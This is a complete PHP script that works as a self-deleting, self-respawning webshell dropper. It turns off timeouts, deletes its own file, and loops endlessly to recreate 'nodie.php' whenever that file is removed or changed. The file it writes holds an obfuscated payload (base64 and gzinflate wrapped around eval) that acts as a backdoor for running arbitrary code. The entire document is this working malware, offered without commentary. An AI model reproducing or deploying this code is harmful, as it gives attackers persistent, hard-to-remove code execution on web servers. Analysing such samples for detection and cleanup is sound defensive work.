<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while(1){	
	sleep(5);	
	if(file_exists('nodie.php')){		
		if(md5_file('nodie.php')==='cb1379976d44e704b9294473d7b94d09'){
			
		}else{
			file_put_contents('nodie.php',base64_decode('PD9QSFANCmVWYWwgKCBnemluRmxhdGUgKCBiYXNlNjRfZEVjb2RlICgnU3kxTHpORlFpUS93RHc2SlZrL09UVkdQMWJRR0FBPT0nKSApICk/Pg=='));
		}			
	}else{
		file_put_contents('nodie.php',base64_decode('PD9QSFANCmVWYWwgKCBnemluRmxhdGUgKCBiYXNlNjRfZEVjb2RlICgnU3kxTHpORlFpUS93RHc2SlZrL09UVkdQMWJRR0FBPT0nKSApICk/Pg=='));
	}
}
?>